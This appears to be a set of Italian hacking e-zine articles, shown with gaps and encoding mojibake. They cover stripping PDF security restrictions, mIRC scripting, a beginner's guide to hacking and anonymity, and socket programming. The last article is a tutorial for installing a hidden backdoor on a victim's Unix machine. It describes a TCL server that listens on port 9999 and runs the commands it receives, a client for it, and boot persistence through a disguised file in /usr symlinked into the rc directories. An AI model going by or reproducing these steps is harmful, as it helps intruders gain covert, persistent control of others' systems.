...
->Che cos'Φ il pdf
Il Portable Document Format (PDF) Φ basato sull'Adobe PostScript language a
cui sono state apportati miglioramenti e modiche.
L'Adobe ha rilasciato gratuitamente il suo Adobe Acrobat SDK, cos∞ chiunque
pu≥ creare il suo editor o filtro senza reverse engineering o cose del
genere. Adobe comunque rimane la proprietaria e mantiene per sΦ lo sviluppo
allo scopo di non snaturare il formato (e di tenere segrete alcune
caratteristiche).
Il sistema di password del pdf Φ molto poco sicuro. Esistono due tipi di
...
a un file di essere decifrato e visto. BenchΦ il sistema di cifratura sia
conosciuto non esistono al momento sistemi per craccare la user password.
Si potrebbe tentare qualcosa con un bruteforce.

->Vulnerabilitα
Se qualche caratteristica di sicurezza Φ stata attivata dall'autore del
file, il PDF sarα cifrato. Queste caratteristiche impediscono di
selezionare e copiare il testo e le immagini e di stamparlo.
Ma se un file pdf pu≥ essere visualizzato allora Φ molto vulnerabile,
...
->Modifichiamo il pdf affinchΦ si possa selezionare (e copiare) il testo e
le immagini.
Se abbiamo un file PDF che ha l'opzione di sicurezza solo per la selezione
del testo e delle immmagini, ci verrα in aiuto xpdf, un programma per la
...
dicembre 1999), l'autore mi ha detto che la implementerα nella prossima
versione.
...
possiamo cos∞ provvedere a patchare i sorgenti con
...
giα patchata e impacchettata in rpm ->
...
Il fatto che la grandezza del pdf finale sia pi∙ che quintuplicata, unito
...
che non Φ stato attuato nelle conversioni. Questa ipotesi Φ corroborata dal
fatto che il Readme di xpdf parla dell'algoritmo di compressione LZW
(presente nei vecchi pdf) che Φ brevettato da Unisys Corporation (si,
...
decomprimerli.
Nei nuovi file pdf l'algoritmo LZW non Φ pi∙ usato e come metodo di
compressione si usa il filtro FlateDecode, che Φ lo stesso di gzip, il
quale non Φ sottoposto a brevetti e spesso raggiunge risultati migliori del
vecchio LZW.
...
Ora potrete stampare il vostro file (questa procedura Φ valida anche per
...
scegliendo in "Printer Setup" pdfwrite come device. Il risultato sarα un
pdf senza alcuna opzione di sicurezza attiva ma non potrete fare estrazione
o ricerca del testo giacchΦ avete ottenuto il file per stampa su file (se
...
Abbiamo cos∞ anche scoperto un metodo di protezione ;-) contro la selezione
(e copiatura) del testo, ma questa volta pi∙ efficace di una semplice
...
avuto modo di provarla perchΦ nel momento in cui scrivo queste righe il
...
permessi e la password del proprietario data la user password. Si pu≥
ottenere cos∞ un file identico al precedente che di diverso ha solo i
permessi.
Diverso Φ invece il servizio della stessa Adobe per la conversione da PDF
in altri formati (html, ascii). Per maggiori informazioni consultare
http://access.adobe.com
Un altro servizio gratuito Φ http://www.babinszki.com/distiller/ che
trasforma postscript (anche pi∙ files zippati) in pdf. Anche questo non
...
[MD5 Φ usato nella codifica dei PDF.]
...
tipo chanserv, nickserv e memoserv. I comandi che verranno visualizzati qu∞ di
...
Hello there!
Per quanto riguarda "raw" Φ un comando che serve a visualizare una delle
caratteristiche scritte di comando di mirc asseconda del numero assegnato a raw
il programma visualizzerα un certo tipo di stringa.
...
;on 1:disconnect: {
;timer1 off
Questa parte non viene letta perchΦ presenti i punti e virgole prima di ogni
...
PerchΦ il tutto funzioni correttamente dobbiamo in anzi tutto aprire il nostro
...
E finisce qu∞ la quarta parte del nostro script :-)
...
vogliono intraprendere una esplorazione pi∙ approfondita della rete.
Questo articolo non vuole essere nulla di pi∙, che una serie di informazioni
che un utente con un minimo di esperienza, ritiene scontate, ma forse utili a
chi intraprende le prime esplorazioni.
La rete Φ un mondo da esplorare, per farlo occorre determinazione e
perseveranza. Partirete a piedi, ma un giorno, se grandi saranno le vostre
capacitα, lo girerete con il vostro jet privato.
Iniziate il vostro cammino, spinti dalla curiositα, dalla conoscenza, dal forte
...
sapete rinominare un file? ;>), un cervello fino (questa per≥, Φ merce rara),
qualcosa su cui prendere appunti.
E' utile una buona conoscenza dell'inglese, se non l'avete (non preoccupatevi,
all'inizio se ne pu≥ fare a meno, soprattutto perchΘ io sto scrivendo in
italiano).
Per quanto riguarda hardware e software basta poco, non serve un computer
ultimo modello, per collegarsi a internet serve molto meno di ci≥ che avete
...
tempi migliori.
La ricerca sul World Wide Web non Φ cosa facile, vengono in nostro aiuto i
motori di ricerca.
Impararli ad usare Φ indispensabile, non Φ luogo questo articolo per dilungarsi
...
finisce per no"). Ricordate che non c'Φ metodo migliore per imparare che
provare. 
Fate la vostra ricerca con tutti i motori che conoscete (per ora che siete
all'inizio non distinguer≥ motori di ricerca, indici sistematici e metarisorse)
AstaLaVista non Φ la soluzione ai vostri problemi, per iniziare provate:
...
firmare il GuestBook (se c'Φ), sembra poco, ma al webmaster solitamente fa
molto piacere.
Con che chiavi di ricerca cercare?
Iniziate con le pi∙ scontate, poi ne troverete altre che vi porteranno
...
tutte le combinazioni), e poi chi pi∙ ne ha pi∙ ne metta. 
...
su *chi* ha realizzato i suddetti programmini, probabilmente avrα un sito, e
...
come rattoppare il tuo sistema (che ti sei reso conto assomiglia pi∙ ad un
groviera che alla suddetta toma). E qui inizia tutto. Sappiate che non Φ
indispensabile essere paranoici in fatto di sicurezza del proprio sistema;
quella Φ roba da hacker, non fa per voi, almeno per ora ;). Basta che copriate
le principali falle, tanto la sicurezza assoluta in rete non esiste.
Windows, di suo Φ instabile ma abbastanza sicuro, a patto che non abbiate
troiani installati, o la porta 139 aperta. Eventualmente trovate programmi
specifici per risolvere questi problemi.
Con un minimo di difesa nessun lamer potrα mai violare il vostro sistema, un
hacker ci riuscirebbe, molto probabilmente (con tempo e astuzia), ma
solitamente gli hacker se ne fregano del vostro computerino, cosa sarα mai,
rispetto ai sistemi del CERN??? ;)
Quindi calmi. Basta un buon antivirus ben aggiornato, un firewall Φ superfluo,
anche perchΘ (probabilmente) non lo sapete configurare, quindi Φ
controproducente.
Tempi duri? Arriverα il giorno di fare festa.
Ora iniziano gli studi. Una buona conoscenza di internet Φ basilare, potete
...
idea di cosa sia Internet, e capirete che non Φ solo WWW.
Gli studi non finiscono qui, bisogna iniziare a leggere le riviste del settore,
la migliore Φ NetRunner (o forse sono un po' di parte?), ma ne esistono altre
...
Le e-zine in lingua inglese sono ancor pi∙ numerose, ma elencarle non Φ scopo
di questo articolo.
...
normale, niente panico. Leggi tutto ci≥ che pensi sia utile (man mano che
...
ci≥ che avevi giα letto. Probabilmente, ci≥ che prima non avevi capito ora ti Φ
un po' pi∙ chiaro, pian piano, non ci saranno pi∙ segreti per te.
IMHO nessuna guida potrα mai spiegarvi l'arte dell'hacking (e che gli hacker mi
...
che faccio publicitα occulta), altre le trovate su www.bismark.it, solo per
...
e/o nicotina. Tra qualche tempo, lo stare davanti al computer sarα una nuova
...
preoccupatevi c'Φ una FAQ per ogni cosa, anche per la netiquette!). Le news da
...
;) in quanto non Φ una news per hacker, ma per utenti, "semplici", se cos∞ Φ
lecito dire.  
alt.hacker.cough.cough.cough, potrebbe essere la news giusta dove rivolgere
qualche domanda sull'insicurezza, l'utenza media Φ  molto taciturna, ma
potreste avere comunque delle risposte.
Qualche raccomandazione: aspettate a postare, leggete e guardate da che parte
tira il vento; non fate domande che hanno giα avuto risposta nel NG o nella FAQ
(che avete letto, non Φ vero?); siate umili, non fate vedere che siete
...
Altra risorsa Φ la biblioteca. Ci sono diversi libri da leggere, "ah, si,
...
e vi consiglio pi∙ caldamente dei bei manuali riguardanti Internet, Linux,
Unix, il protocollo TCP/IP, etcetera per approfondire (e capire) ci≥ che
...
l'autore dell'articolo), un saggio uso della fotocopiatrice, vi risparmierα
...
universitarie di facoltα tecniche.
...
il perchΘ.
Linux Φ un sistema operativo con cui dovrete prendere *mooooolta* confidenza,
ma con le dovute cautele. Se siete fortunati avete un secondo computer (un 486
per linux Φ giα un lusso) su cui installarlo, bene, fatelo e studiatelo; non
...
provider (se Φ piccolo non fa mai storie) ma state attenti, dalla faccia che vi
ritovate traspaiono le vostre losche intenzioni. Se avete un amico che usa
linux, la shell ve la pu≥ dare lui, ma allora siete nati con la camicia, avete
una shell gratis, che non dovete gestire e in pi∙ un amico che vi potrα
certamente aiutare con linux.
Se proprio non potete fare altro installatelo su una partizione del vostro HDD.
Linux a prima vista (e anche a seconda) Φ complicato da usare, ma vi assicuro
...
le chat insomma, in quanto, se non lo si conosce bene, pu≥ essere molto pi∙
...
Service), una sua buona conoscenza pu≥ tornare molto utile, e un prompt vi
...
qualsiasi versione, per iniziare, andrα benissimo.

Il secondo, non certo per importanza, argomento Φ la programmazione pu≥ essere
...
200k l'uno) ce ne sono in quantitα, per ogni linguaggio. Il linguaggio che vi
conviene imparare per primo Φ il C (le risate che sentite sono dovute al fatto
che Φ molto conosciuta la mia infima competenza in tale linguaggio),
successivamente datevi (questo passaggio sarα molto pi∙ facile che il partire
da zero) al Visual Basic, al C++, al Delphi  e vedete di imparare a scrivere
script Bash, che torna sempre molto utile.
Non sdegnate, perchΘ antichi, il TurboPascal, il Basic, e reperti preistorici
...
prograzione.it)
Vi assicuro che impararne altri dopo averne giα imparato uno sarα molto pi∙
facile. Nella programmazione il primo passo Φ il pi∙ difficile, l'ultimo non lo
so, non ci sono mai giunto. Per sapere certe cose dovrete trovare un coder
serio.

Per chiarire ogni dubbio Φ giunto il momento di prendere contatto con altre
persone, con cui potrete anche scambiare opinioni, da cui potrete imparare
nuove cose.
Provate qualche buona chat, su IRC c'Φ molta gente che saprα darvi le
informazioni che volete, ma fate attenzione, il numero di persone che malgrado
non sappiano nulla e parlano Φ pi∙ elevato di quanto potete immaginare, dovete
...
andate per gradi.
Non andate su tutte le furie se nessuno vi risponde, nessuno Φ tenuto a farlo,
nulla ti Φ dovuto. Naturalmente un po' di buone maniere facilitano le cose, ed
il social engineering Φ nella vita di tutti i giorni, fatevi sotto (e ricordate
che gli hacker sono bravi e belli).
E' venuto il momento di mettere a frutto gli insegnamenti.
Potete iniziare a provare vari programmini ad uso e consumo dei lamer (non c'Φ
nulla di male, se sapete come funzionano, perchΘ e quando usarli, se non vi
sentite hacker nel farlo). Ma su chi provarli? Su voi stessi, naturalmente! Il
vostro IP, se non siete connessi, Φ (solitamente) 127.0.0.1,  rivolgete sul
vostro sistema ogni tipo di attacco, oltre a testarne l'integritα Φ un modo
...
le difese, ma intanto sapete esattamente come funziona. Detto questo Φ facile
...
l'IP. Questo numerino vi stα sempre addosso, e parla molto di voi a chi punisce
le malefatte, e questo Φ male.
I manuali su come raggiungere dei buoni livelli di anonimato non mancano,
diventate invisibili...
A questo punto penso di non aver pi∙ niente da dirvi.
Datevi alla pazza gioia(beh, lasciate stare il maiframe del pentagono, un sito
porno del guatemala Φ sicuramente meno rischioso), ma Φ giunto il momento di
essere un po' pi∙ paranoici. Fate attenzione, mi raccomando. Siete hacker? No,
e non lo sarete neanche quando vi ci chiameranno, solo ora siete consci del
fatto che essere hacker non vi interessa poi cos∞ tanto, ci≥ che conta Φ il
fatto che non avete pi∙ frontiere...
Questo articolo Φ solo un piccolo inizio.
Ricordatevi sempre che la risposta ad ogni vostra domanda Φ nella vostra mente
...
basilari (passi in avanti nell'underground digitale?) o ancora pi∙ basilari (ma
lo sapete accendere il computer?) fatemelo sapere - anche all'editore, cos∞ mi
...
intendono muovere i primi passi nell'sottosuolo della rete, Φ invece riferito
...
l'autore, Φ riuscito a scrivere questo articolo, allora io posso diventare il
re della rete... fatevi forza!
La mia mail Φ lordmibo@inwind.it, detto questo non mi resta che augurarvi buona
fortuna.
...
incorretto che ho fatto di certi termini, Φ solo a scopo divulgativo...
...
ritendo esserci pi∙ somiglianze che differenze.
...
Rincominciamo questo punto cercando di essere pi∙ chiari! Quando si decide di
...
1 il SERVER (in questo caso non un vero e proprio programma ma un qualcosa di
  pi∙ complesso) attende connessioni all'IP del vostro sito sulla porta 80.
...
xchat per Linux sono i pi∙ famosi) e scoprirete che non fa altro che
...
Come funzionanto? Nulla di pi∙ semplice!
...
Il socket e' pi∙ o meno visto come il C, quindi come una variabile ben
...
client in Visual Basic! Anzi! Spesso e' pi∙ congeniale se abbiamo esigenze
particolari tipo 2 diversi sistemi operativi. Vedremo in seguito.


PRATICA (ovvero qualche esempio per confrontare meglio!):

RICORDO CHE QUEST'ARTICOLO NON ╚ UN TUTORIAL SULLA PROGRAMMAZIONE QUINDI NON
...
TIPO: indica il modo in cui avviene la comunicazione. Ce ne sono vari tipi. I
      ...
      SOCK_STREAM connessione permanente e bidirezionale che si basa sul
                  flusso continuo di byte. E' probabilmente il pi∙ sicuro
...
comunicazioni o un semplice trojan, ma forse per cose relealemtne pi∙ tecniche
il C da pi∙ liberta' a scapito forse della leggerezza di codice e di
semplicita'.

In VB creare un banale SERVER vuol dire 10 righe (max), in C abbiamo visto
prima. Pi∙ di 30! Il visual Basic lo porto il linux e non ho possibilita' di
...
Il client e' ancor pi∙ inpressionante come semplitica'. Due comandi indicano
...
#possiamo vedere che non e' pi∙ TCL ma WISH, poiche' voglio la grafica
...
Mi direte: ma e' pi∙ corto di VB! Si' e' vero solo perche' non ho messo l'opzione
...
I programmi pi∙ piccoli mai esistiti sulla faccia della terra!
...
Eccomi di nuovo qui! Sono tornato con una bella idea (o forse molto pi∙ di
...
*nix e Linux. Io l'ho provato su LINUX e vi assicuro che funziona! Quindi...
  ...
  *****************************************************************
 ** Tutto quello che scriver≥ Φ solo a scopo informativo, quindi  **
*** se fate danni o semplicemente vi sgamano e vi trovare la pula ***
*** sotto casa... Φ solo un problema vostro. In non centro        ***
...
permettentoci di fare sulla macchina della vittima ci≥ che ci pare e piace!
...
Probabilmente conoscendolo sta leggendo pure questo articolo (PS: se verrα
pubblicato!) quindi... non vi posso (ma soprattutto non GLI!) posso dire il
nome.

Io ho scelto il TCL come linguaggio per un semplice fatto: 1 Φ veloce da
scrivere! Si pu≥ scrivere direttamente sul computer della vittima :)
...
1
Tutta a programmazione che qui vi mostrer≥ sarα fatta in TCL. E' "di serie" su
tutte le piattaforme linux e in teoria su tutte le piattaforme *NIX. Dico in
teoria perchΦ diciamo che se prendete una distro UNIX degli anni 60... forse
non c'Φ ancora!
...
Noi sappiamo che esistono dozzine di backdoors. Sicuramente il pi∙ semplice Φ
un aggiungere un nuovo utente con permessi root, ma fin tanto che voi creiate
un nick anonimo, comunque l'amministratore prima o poi se ne accorgerα.

Forse, una pi∙ sofisticata Φ creare un server da piazzare all'interno dell'OS
in modo particolarmente anonimo, che parta all'avvio e che ascolti una porta
sconosciuta. ╚ possibile accorgersi pure qui della presenza della backdoor...
ma forse Φ pi∙ complicato (specie se OP Φ particolarmente incompetente!).
...
L∞ c'Φ anche una spiegazione generale del funzionamento.

Abbiamo creato un socket "s" che Φ server e che ascolta alla porta 9999.
...
Cos∞ possiamo fare pi∙ comandi che richiedono tempo!
...
Vi chiedete perchΦ in inglese? Meglio non rischiare! Unix Φ tutto in inglese.
...
ok?
Questo perchΦ in LINUX come in UNIX i comandi possono essere dati anche non in
serie ma separati da un ;

Questo potrebbe essere soddisfacente perchΦ apre la porta in modo veloce...
il client, appena dato il comando si sconnetterα data il fatto che il comando
Φ stato messo in background.

Mica male!

Da notar il ciclo che ci permette di dare un messaggio pi∙ di una riga. Questo
ci sarα utile per il CLIENT quindi...


Ora preoccupiamoci del CLIENT:

Il client pu≥ essere benissimmo una semplice sessione di telnet, ma dato che
...
proc invia {} {
  ...
  #Controllo se l'HOST Φ stato messo:
  ...
  #Controllo se l'IP Φ corretto:
  } elseif {![string match *.*.*.* $host]} {
     tk_messageBox -icon info -type ok -message \
     "Attenzione! L'HOST Φ tipo 127.0.0.1 !"
     return 1
  } else {
...
Semplicemente mando un messaggio all'IP... sarα poi lui a farlo eseguire.
Sappiate che il CLIENT Φ accetta 2 variabili: HOST e MSG. Uno Φ il IP del
server, l'altro Φ il messaggio da mandare. Per sicurezza ho fatto dei
controlli sulle variabili.
Questi sono:

LA LUNGHEZZA (che non deve essere nulla!): if {[string length $msg]<=0}...
ed anche: if {[string length $msg]<=0} {...
SE ╚ UN VERO IP: if {![string match *.*.*.* $host]} {...
...
Passiamo alla parte pi∙ interessante... far partire un processo all'avvio!
COME FARE?
Semplicissimo!

Basterα creare uno script anche ben inculato... e linkarlo nel posto giusto!
Metter≥ lo server in TCL nella directory /usr e lo salver≥ col nome di 1dd2cd.
...
case "$1" in
        start)
                ...
                ;;
        stop)
                #Volete dare pure la possibilitα di fermarlo? =)
                echo "."
                ;;
        *)
...
Dico dovrebbe perchΦ cambia in base alle distro di UNIX o LINUX.  Entrate
nella directory che ci assomiglia di pi∙ e all'interno entrate nella directory
che volete!

Dico questo perchΦ mediamente queste dovrebbero tipo: rc1.d rc2.d o simili
Sappiate che in base alle varie distro pu≥ cambiare abbastanza!

Entrati l∞ dentro fate questo:

ln -s /usr/1dd2ck S391dd2ck

Cosa ho fatto? Semplice, ho creato un collegamento simbolico da /usr/1dd2ck
alla directory in cui siete ora. In pi∙ ho dato il nome al link come
S39idd2ck.
...
come Knumero. ╚ indifferente che lettera scegliete l'importante e che il
numero sia molto basso. Io ho scelto S39 ma se c'Φ giα cambiate!

Mettete il numero che volete voi in base all'assenza di essi. Quindi fate!
Pi∙ il numero Φ piccolo pi∙ parte prima all'avvio. Avete in mente come parte
una macchina linux? Dopo i lavori del kernel, incomincia a far partire file
di configurazione. Quelli sono tutti l∞! E vengono caricati in ordine del
...
e via! La backdoor Φ montata e funzionante... non vi resta che uscire e
